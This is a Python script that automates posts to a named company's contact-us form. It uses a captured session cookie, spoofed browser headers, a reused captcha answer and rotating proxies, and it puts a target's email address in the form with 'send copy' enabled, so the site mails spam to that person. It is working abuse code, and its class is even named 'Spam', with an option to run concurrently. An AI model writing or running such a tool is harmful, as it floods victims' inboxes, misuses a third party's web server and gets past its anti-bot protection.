import requests

cookies = {
    'PHPSESSID': 'c5bd567180eca1e4baba133d72bc01c5',
    '_icl_current_language': 'en',
    '_ga': 'GA1.2.1647355609.1677576943',
    '_gid': 'GA1.2.585042399.1677576943',
    '_gat': '1',
}

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    # 'Cookie': 'PHPSESSID=c5bd567180eca1e4baba133d72bc01c5; _icl_current_language=en; _ga=GA1.2.1647355609.1677576943; _gid=GA1.2.585042399.1677576943; _gat=1',
    'Origin': 'https://www.hlbpremuscentralafrica.com',
    'Pragma': 'no-cache',
    'Referer': 'https://www.hlbpremuscentralafrica.com/contact-us/',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

from os.path import basename

import requests

from module import Spam


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        data = {
            'fieldName': self.get_text(),
            'fieldCompanyName': self.get_text(),
            'fieldEmail': target,
            'fieldCity': 'test',
            'fieldCountry': 'test',
            'fieldSubject': self.get_text(),
            'fieldMessage': 'test',
            'fieldSendCopy': 'yes',
            'captcha_1': '174225949',
            'captcha': 'p8vw6l',
            'contact_us_form': '',
            'enter_your_email_for_get_notification': target,
            'contact-us': '',
        }

        response = requests.post('https://www.hlbpremuscentralafrica.com/contact-us/', cookies=cookies, headers=headers,
                                 data=data, proxies=self.get_proxies())
        return response


def main():
    s = 'success'
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    # if res:
    #     spam.run_concurrently()


if __name__ == '__main__':
    main()
